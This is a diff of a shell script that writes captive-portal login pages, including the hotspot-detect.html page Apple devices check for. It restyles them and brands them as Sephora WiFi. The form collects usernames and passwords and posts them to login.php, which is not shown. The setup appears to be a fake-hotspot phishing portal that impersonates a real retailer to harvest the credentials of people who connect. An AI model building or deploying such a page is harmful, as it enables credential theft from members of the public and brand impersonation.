@@ -83,10 +83,70 @@ cat <<EOF > /var/www/html/index.html
 <head>
     <meta charset="UTF-8">
     <title>Connexion WiFi</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        form {
+            width: 400px;
+            text-align: center; 
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo-container img {
+            max-width: 300px;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        input[type="submit"] {
+            background-color: black;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 90%;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #333;
+        }
+    </style>
 </head>
 <body>
-    <h2>Authentification WiFi</h2>
     <form action="login.php" method="POST">
+        <div class="logo-container">
+            <img src="logo.png" alt="Logo">
+        </div>
+        <h2>Bienvenue chez Sephora</h2>
         <input type="text" name="username" placeholder="Nom d'utilisateur" required><br>
         <input type="password" name="password" placeholder="Mot de passe" required><br>
         <input type="submit" value="Connexion">
@@ -101,10 +161,70 @@ cat <<EOF > /var/www/html/hotspot-detect.html
 <head>
     <meta charset="UTF-8">
     <title>Connexion WiFi</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        form {
+            width: 400px;
+            text-align: center; 
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo-container img {
+            max-width: 300px;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        input[type="submit"] {
+            background-color: black;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 90%;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #333;
+        }
+    </style>
 </head>
 <body>
-    <h2>Authentification WiFi</h2>
     <form action="login.php" method="POST">
+        <div class="logo-container">
+            <img src="logo.png" alt="Logo">
+        </div>
+        <h2>Bienvenue chez Sephora</h2>
         <input type="text" name="username" placeholder="Nom d'utilisateur" required><br>
         <input type="password" name="password" placeholder="Mot de passe" required><br>
         <input type="submit" value="Connexion">
